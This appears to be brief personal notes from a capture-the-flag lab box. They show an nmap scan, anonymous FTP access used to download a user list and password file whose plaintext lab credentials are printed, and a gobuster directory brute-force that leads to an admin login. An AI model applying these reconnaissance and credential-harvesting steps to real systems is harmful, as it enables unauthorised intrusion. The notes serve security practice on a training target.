```
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.87
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Smash - Bootstrap Business Template
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 1248E68909EAE600881B8DB1AD07F356
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
Service Info: OS: Unix

```

Brah - allowed userlist.passws

```
ftp Anonymous@10.129.1.15                                
Connected to 10.129.1.15.
```
`ftp> get allowed.userlist `
`ftp> get allowed.userlist.passwd `

```
┌──(kali㉿kali)-[~/Crocodile]
└─$ cat allowed.userlist
aron
pwnmeow
egotisticalsw
admin
                                                                                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Crocodile]
└─$ cat allowed.userlist.passwd 
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd

```

`sudo gobuster dir -u http://10.129.1.15/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php
`
Finds login.php. Admin creds are the root flag